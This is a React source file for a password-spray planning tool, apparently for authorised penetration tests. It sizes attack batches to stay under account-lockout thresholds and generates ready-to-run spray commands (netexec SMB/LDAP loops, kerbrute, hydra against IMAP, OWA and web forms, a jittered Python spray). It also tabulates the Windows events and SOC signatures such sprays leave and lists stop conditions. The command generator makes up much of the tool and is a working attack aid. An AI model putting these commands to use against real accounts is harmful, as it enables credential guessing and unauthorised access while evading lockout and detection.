import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  KVTable,
  NumberInput,
  OutputBlock,
  OutputField,
  SectionTitle,
  Select,
  TextArea,
  TextInput,
} from '@/components/ui';

/**
 * Password spray planner.
 *
 * Arithmetic model (all of it is echoed back to the operator in the "Sizing"
 * table so nothing is a black box):
 *   attempts        = accounts × passwords
 *   per-account     = passwords                   (one password tried against every account)
 *   per-window      = accounts × passwords tried inside one observation window
 *   breach          = per-window ≥ lockout threshold
 *   batch           = accounts × passwords, capped at the threshold − 1 when known
 *   elapsed         = queue / rate + pauses
 *
 * The lockout model assumes the counter is per-account and resets only after the
 * observation window has passed with no further failure. Policies that reset on
 * success change the shape, not the order of magnitude.
 */

type Protocol = 'smb' | 'ldap' | 'owa' | 'imap' | 'form';

interface ProtocolDef {
  value: Protocol;
  label: string;
  port: string;
  rate: number;
  note: string;
  /** Hash type this protocol leaks on a successful bind, if any. */
  leak: string;
}

const PROTOCOLS: ProtocolDef[] = [
  { value: 'smb', label: 'SMB (netexec smb)', port: '445', rate: 12, note: 'Domain auth; 4776 on the DC. Watch for account lockout tooling.', leak: 'NetNTLMv2 on downgrade' },
  { value: 'ldap', label: 'LDAP (netexec ldap)', port: '389', rate: 20, note: 'Fast and quiet; no source host artefacts beyond 4625 on the DC.', leak: 'Often returns description/OS fields' },
  { value: 'owa', label: 'OWA / Exchange (form)', port: '443', rate: 6, note: 'Shape-based detection; 4625 generated on the CAS, not the DC.', leak: 'Mailbox rules reachable after success' },
  { value: 'imap', label: 'IMAP (hydra)', port: '143', rate: 8, note: 'Frequently left unthrottled; pre-auth banner leaks the server string.', leak: 'Mailbox readable immediately' },
  { value: 'form', label: 'Custom web form', port: '443', rate: 5, note: 'Rate limiting is application-specific; assume nothing until measured.', leak: 'Session cookie and role' },
];

const EVENT_ROWS: Array<[string, string, string, string]> = [
  ['4625', 'Windows', 'Failed logon on the target host (SMB/RDP/interactive).', 'Per-account count with a shared source IP — the classic spray fingerprint.'],
  ['4624 (type 3)', 'Windows', 'Successful network logon after a hit.', 'One success in a stack of failures from the same IP.'],
  ['4776', 'DC (NTLM)', 'Credential validation via NTLM.', 'Many distinct usernames, one password, same workstation name.'],
  ['4768', 'DC (Kerberos)', 'TGT requested — pre-auth failure if the password is wrong.', 'Burst of AS-REQ from a single host across many principals.'],
  ['4771', 'DC (Kerberos)', 'Pre-authentication failed.', 'Pairs 1:1 with 4768; count 4771 per user, not per attempt.'],
  ['4740', 'DC', 'Account locked out by the DC.', 'This event means the plan breached the policy — stop immediately.'],
  ['4625 + 4771 mix', 'Hybrid', 'Both NTLM and Kerberos failures from the same source.', 'Tool switched protocols mid-run; SOC runbooks key on this.'],
  ['Application 401', 'App logs', 'Rejected credential on a web/IMAP front end.', 'Correlate request rate with X-Forwarded-For and User-Agent.'],
  ['Source-IP reputation', 'Proxy/firewall', 'One external or VLAN IP hitting authenticating ports.', 'Fresh IP with no history is the strongest single signal.'],
];

const STOP_CONDITIONS: string[] = [
  'A 4740 (account lockout) appears for any in-scope account — stop the run, not just that account.',
  'Two consecutive batches return identical counts — the endpoint is rate limiting and your numbers are fiction.',
  'A hit appears: stop, verify out-of-band with the client contact, and record the password tuple before any reuse.',
  'Any 4625 burst exceeds 200 per account in a window — you are being logged even if nothing locked.',
  'The client contact cannot be reached on the escalation number — an unmonitored spray is an incident.',
];

function parseList(raw: string): string[] {
  const seen = new Set<string>();
  const out: string[] = [];
  for (const line of raw.split('\n')) {
    const v = line.trim();
    if (!v || v.startsWith('#')) continue;
    const key = v.toLowerCase();
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(v);
  }
  return out;
}

function fmtDuration(seconds: number): string {
  if (!Number.isFinite(seconds) || seconds <= 0) return '0s';
  const s = Math.round(seconds);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const parts: string[] = [];
  if (d) parts.push(`${d}d`);
  if (h) parts.push(`${h}h`);
  if (m) parts.push(`${m}m`);
  if (sec && !d) parts.push(`${sec}s`);
  return parts.join(' ') || `${s}s`;
}

export default function PasswordSprayPlanner() {
  const [usersRaw, setUsersRaw] = useState('a.smith\nb.jones\nc.patel\nd.okafor\ne.novak');
  const [passRaw, setPassRaw] = useState('Summer2026!\nAutumn2026!\nWelcome2026');
  const [domain, setDomain] = useState('EXAMPLE');
  const [useDomain, setUseDomain] = useState(true);
  const [threshold, setThreshold] = useState(5);
  const [windowMin, setWindowMin] = useState(30);
  const [cooldownMin, setCooldownMin] = useState(31);
  const [rpm, setRpm] = useState(60);
  const [continueOnSuccess, setContinueOnSuccess] = useState(false);
  const [protocol, setProtocol] = useState<Protocol>('smb');
  const [jitter, setJitter] = useState(30);

  const users = useMemo(() => parseList(usersRaw), [usersRaw]);
  const passwords = useMemo(() => parseList(passRaw), [passRaw]);
  const proto = PROTOCOLS.find((p) => p.value === protocol) ?? PROTOCOLS[0]!;

  const plan = useMemo(() => {
    const accounts = users.length;
    const pw = passwords.length;
    const attempts = accounts * pw;
    const perAccount = pw;
    const perWindow = accounts * pw;
    const thresholdKnown = threshold > 0;
    const margin = thresholdKnown ? Math.max(1, threshold - 1) : accounts;
    const batch = Math.max(1, Math.min(accounts, margin));
    const batches = attempts ? Math.ceil(accounts / batch) * pw : 0;
    const breaches = thresholdKnown && perWindow >= threshold;
    const perAccountBreach = thresholdKnown && perAccount >= threshold;
    const safeRate = Math.max(1, Math.min(rpm, proto.rate * 5));
    const runSeconds = (attempts / safeRate) * 60;
    const pauseSeconds = Math.max(0, batches - 1) * cooldownMin * 60;
    const elapsed = runSeconds + pauseSeconds;
    return {
      accounts,
      pw,
      attempts,
      perAccount,
      perWindow,
      batch,
      batches,
      breaches,
      perAccountBreach,
      safeRate,
      runSeconds,
      pauseSeconds,
      elapsed,
    };
  }, [users, passwords, threshold, cooldownMin, rpm, proto]);

  const commands = useMemo(() => {
    const userFile = 'users.txt';
    const passFile = 'passwords.txt';
    const d = useDomain && domain.trim() ? domain.trim() : '';
    const t = plan.safeRate;
    const w = Math.max(1, Math.round(cooldownMin / 60 * 10) / 10);
    const lines: string[] = [];
    if (protocol === 'smb' || protocol === 'ldap') {
      lines.push(
        `# ${proto.label} — one password across the batch, then pause`,
        `netexec ${protocol} DC01.example.com -u ${userFile} -p '${passwords[0] ?? 'PASSWORD'}' ${d ? `-d ${d}` : ''} --continue-on-success`.replace(/\s+/g, ' '),
        '',
        `# Loop with a cool-down between passwords (${cooldownMin} min)`,
        `while read -r P; do`,
        `  netexec ${protocol} DC01.example.com -u ${userFile} -p "$P" ${d ? `-d ${d}` : ''} --threads ${Math.min(8, plan.batch)}`,
        `  sleep ${cooldownMin * 60}`,
        `done < ${passFile}`,
      );
    }
    if (protocol === 'smb' || protocol === 'ldap' || protocol === 'owa') {
      lines.push(
        '',
        `# Kerberos pre-auth spray (no lockout if the policy counts 4771 separately)`,
        `kerbrute passwordspray -d ${d || 'example.com'} --dc DC01.example.com ${userFile} '${passwords[0] ?? 'PASSWORD'}'`,
      );
    }
    if (protocol === 'owa' || protocol === 'imap' || protocol === 'form') {
      const svc = protocol === 'imap' ? 'imap' : protocol === 'owa' ? 'https-get-form' : 'http-post-form';
      lines.push(
        '',
        `# hydra — ${t} tasks, ${w}s wait between connections`,
        `hydra -L ${userFile} -P ${passFile} -t ${t} -W ${w} -f \\`,
        `  ${svc}://mail.example.com${protocol === 'imap' ? '/:143' : '/:443'}${protocol === 'imap' ? '' : ' FORM_PATH'}`,
      );
    }
    lines.push(
      '',
      '# Scheduler-side spray with jitter (see lib/spray)',
      `python3 -m spray smb --target DC01.example.com --users ${userFile} --passwords ${passFile} \\`,
      `  --rate ${t} --jitter ${Math.min(100, jitter)} --sleep ${cooldownMin}m ${continueOnSuccess ? '--continue-on-success' : '--stop-on-success'}`,
    );
    return lines.join('\n');
  }, [protocol, proto, domain, useDomain, passwords, cooldownMin, plan, jitter, continueOnSuccess]);

  const scheme = useMemo(() => {
    const rows: Array<[string, string]> = [];
    if (!plan.attempts) return rows;
    const names = [...new Set(users)];
    let cursor = 0;
    for (let round = 0; round < plan.pw; round++) {
      const slice = names.slice(cursor, cursor + plan.batch);
      cursor = (cursor + plan.batch) % Math.max(1, names.length);
      const start = round * (plan.runSeconds / plan.pw + cooldownMin * 60);
      rows.push([
        `Batch ${round + 1}`,
        `${passwords[round] ?? '—'} · ${slice.length} account(s) · T+${fmtDuration(start)} → T+${fmtDuration(start + plan.runSeconds / plan.pw)}`,
      ]);
    }
    return rows;
  }, [plan, users, passwords, cooldownMin]);

  const verdictTone = plan.breaches ? 'danger' : plan.perAccountBreach ? 'warn' : 'ok';
  const verdictTitle = plan.breaches
    ? `Policy breach: ${plan.perWindow} attempts per account per window ≥ threshold ${threshold}`
    : plan.perAccountBreach
      ? `Borderline: ${plan.perAccount} passwords per account is at the threshold`
      : `Within policy: ${plan.batch} account(s) per batch, threshold ${threshold}`;

  return (
    <>
      <Card title="Inputs">
        <div className="grid gap-4 sm:grid-cols-2">
          <TextArea
            label={`User list — ${users.length} unique`}
            value={usersRaw}
            onChange={setUsersRaw}
            rows={7}
            placeholder="a.smith&#10;b.jones"
            hint="One account per line. Blank lines and #comments are ignored."
          />
          <TextArea
            label={`Password candidates — ${passwords.length} unique`}
            value={passRaw}
            onChange={setPassRaw}
            rows={7}
            placeholder="Summer2026!&#10;Autumn2026!"
            hint="Two to five candidates. More than that is a guessing campaign, not a spray."
          />
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-3">
          <TextInput label="AD domain (optional)" value={domain} onChange={setDomain} mono placeholder="EXAMPLE" hint="Blank for local accounts" />
          <Select<Protocol>
            label="Target protocol"
            value={protocol}
            onChange={setProtocol}
            options={PROTOCOLS.map((p) => ({ value: p.value, label: p.label }))}
            hint={`port ${proto.port} · ${proto.note}`}
          />
          <NumberInput label="Requests / minute" value={rpm} onChange={setRpm} min={1} max={6000} hint="Measured, not hoped for" />
          <NumberInput label="Lockout threshold" value={threshold} onChange={setThreshold} min={0} max={50} hint="0 = unknown / no lockout" />
          <NumberInput label="Observation window (min)" value={windowMin} onChange={setWindowMin} min={1} max={1440} hint="Counter reset period" />
          <NumberInput label="Cool-down (min)" value={cooldownMin} onChange={setCooldownMin} min={1} max={1440} hint={`≥ ${windowMin} to let counters reset`} />
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <Checkbox
            checked={useDomain}
            onChange={setUseDomain}
            label="Authenticate with DOMAIN\\user"
            description="Off for local SAM/IMAP accounts where the realm is implicit."
          />
          <Checkbox
            checked={continueOnSuccess}
            onChange={setContinueOnSuccess}
            label="--continue-on-success"
            description="Keeps the run going after a hit. Safer for coverage, noisier for the SOC."
          />
        </div>
      </Card>

      <Card title="Sizing">
        <KVTable
          rows={[
            ['Accounts', `${plan.accounts}`],
            ['Passwords', `${plan.pw}`],
            ['Total attempts', `${plan.accounts} × ${plan.pw} = ${plan.attempts}`],
            ['Attempts per account', `${plan.perAccount} (one per candidate password)`],
            ['Attempts per window', `${plan.perWindow} across ${plan.accounts} account(s)`],
            ['Safe batch size', `${plan.batch} account(s) per password round (threshold − 1, or the full user list when unknown)`],
            ['Batch rounds', `${plan.batches}`],
            ['Effective rate', `${plan.safeRate} req/min (capped from ${rpm}, protocol ceiling ×5 = ${proto.rate * 5})`],
            ['Run time', fmtDuration(plan.runSeconds)],
            ['Cool-down total', fmtDuration(plan.pauseSeconds)],
            ['Total elapsed', fmtDuration(plan.elapsed)],
          ]}
        />
        <div className="mt-4 grid gap-3 sm:grid-cols-3">
          <OutputField label="Batch size" value={String(plan.batch)} />
          <OutputField label="Pause between batches" value={`${cooldownMin} min`} />
          <OutputField label="Total elapsed" value={fmtDuration(plan.elapsed)} />
        </div>
        <div className="mt-4">
          <Callout tone={verdictTone} title={verdictTitle}>
            {plan.breaches
              ? `Trying all ${plan.perWindow} combinations inside one ${windowMin}-minute window must trip a threshold of ${threshold}. Reduce the batch to ${plan.batch}, or increase the cool-down past ${windowMin} minutes so the counter resets between rounds.`
              : plan.perAccountBreach
                ? `A single round sits exactly on the threshold. If the counter is inclusive, the last account in the batch locks. Drop to ${Math.max(1, threshold - 1)} per batch.`
                : `Batch of ${plan.batch} keeps the worst-case counter at ${plan.batch} < ${threshold}. With ${plan.pw} candidate(s) and a ${cooldownMin}-minute cool-down, the whole schedule fits in ${fmtDuration(plan.elapsed)}.`}
          </Callout>
        </div>
      </Card>

      <Card title="Schedule">
        {scheme.length === 0 ? (
          <div className="rounded border border-dashed border-[var(--card-border)] px-3 py-6 text-center text-[12.5px] text-[var(--text-faint)]">
            Add at least one account and one password to see the round plan.
          </div>
        ) : (
          <KVTable rows={scheme} />
        )}
        <div className="mt-4 space-y-2 text-[12px] leading-relaxed text-[var(--text-muted)]">
          <p className="m-0">
            Order matters: rotate accounts first, passwords second. Hitting one account with N passwords in quick
            succession is a brute force; hitting N accounts with one password is a spray.
          </p>
          <p className="m-0">
            Protocol ceiling used here: {proto.rate} req/min with a ×5 tolerance before the endpoint starts returning
            synthetic errors. Re-measure against the actual target — form endpoints are frequently ten times slower.
          </p>
        </div>
      </Card>

      <Card title="Commands">
        <CodeBlock code={commands} label="Generated commands" maxHeight={340} />
        <div className="mt-4">
          <OutputBlock value={commands} label="Copy all" rows={6} />
        </div>
      </Card>

      <Card title="What this leaves in logs">
        <div className="overflow-x-auto">
          <table className="w-full border-collapse text-[12px]">
            <thead>
              <tr className="text-left text-[11px] tracking-wide text-[var(--text-faint)] uppercase">
                <th className="py-1 pr-3 font-medium">Event</th>
                <th className="py-1 pr-3 font-medium">Source</th>
                <th className="py-1 pr-3 font-medium">Generates</th>
                <th className="py-1 font-medium">SOC signature</th>
              </tr>
            </thead>
            <tbody>
              {EVENT_ROWS.map(([id, src, what, sig]) => (
                <tr key={id} className="border-t border-[var(--card-border)] align-top">
                  <td className="rf-mono py-1 pr-3 whitespace-nowrap text-[var(--text)]">{id}</td>
                  <td className="py-1 pr-3 text-[var(--text-muted)]">{src}</td>
                  <td className="py-1 pr-3 text-[var(--text-muted)]">{what}</td>
                  <td className="py-1 text-[var(--text-muted)]">{sig}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <div className="mt-4">
          <SectionTitle>Source-IP reputation</SectionTitle>
          <p className="m-0 text-[12px] leading-relaxed text-[var(--text-muted)]">
            Every attempt carries your source address. A residential or cloud IP with no history on {proto.port}/tcp is
            the single strongest pre-lockout indicator a SOC has; a known egress IP buys a few minutes at most. Rotating
            addresses enlarges the blast radius of the IOC set rather than hiding it.
          </p>
        </div>
        <div className="mt-4">
          <Callout tone="danger" title="Stop conditions">
            <ul className="m-0 list-disc space-y-1 pl-4">
              {STOP_CONDITIONS.map((c) => (
                <li key={c}>{c}</li>
              ))}
            </ul>
          </Callout>
        </div>
      </Card>
    </>
  );
}
